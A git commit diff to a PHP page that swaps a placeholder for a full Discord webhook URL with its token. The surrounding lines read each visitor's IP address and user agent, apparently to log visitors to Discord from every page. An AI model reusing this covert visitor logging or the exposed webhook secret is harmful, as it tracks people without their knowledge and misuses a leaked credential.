1959454e193f9d52c3afa68e03356df6a5adddaf
pmnoopmap-pixel <pmnoopmap@gmail.com>
2025-12-04 19:53:18 +0100

    Update Discord webhook URL in index.php

--- index.php
+++ index.php
@@ -11,7 +11,7 @@ NOTE: You can use this in every page if you make a it a external page and requir
 
 <?php
 
-        $webhookurl = "discord webhook link";
+        $webhookurl = "https://discord.com/api/webhooks/1446212687682863185/SeUijFzCUolNK3iEsyn_bvtu4DGMmFuaYO2Wky4u953wQB0R7RFX3R528VnbzTJ9moGY";
 
         $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
         $browser = $_SERVER['HTTP_USER_AGENT'];
